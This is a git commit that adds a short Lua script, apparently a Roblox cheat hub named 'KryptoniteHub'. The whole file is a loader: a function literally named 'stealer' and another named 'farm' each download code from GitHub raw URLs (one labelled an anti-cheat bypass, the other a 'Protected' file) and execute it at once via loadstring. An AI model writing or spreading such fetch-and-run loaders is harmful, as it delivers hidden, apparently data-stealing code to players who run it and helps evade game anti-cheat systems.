a0dd588c56393e2e7eb7d768e481d61a97b63461
XiaongLiaing <161046167+XiaongLiaing@users.noreply.github.com>
2025-06-22 21:17:26 +0630

    Add files via upload

---
+++ KryptoniteHub.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaongLiaing/AntiCheatV3/refs/heads/main/RobloxCheatSystemBypass.txt"))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bitcoinlol/Kryptonite-free/refs/heads/main/Protected_5085813520974140.lua.txt"))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
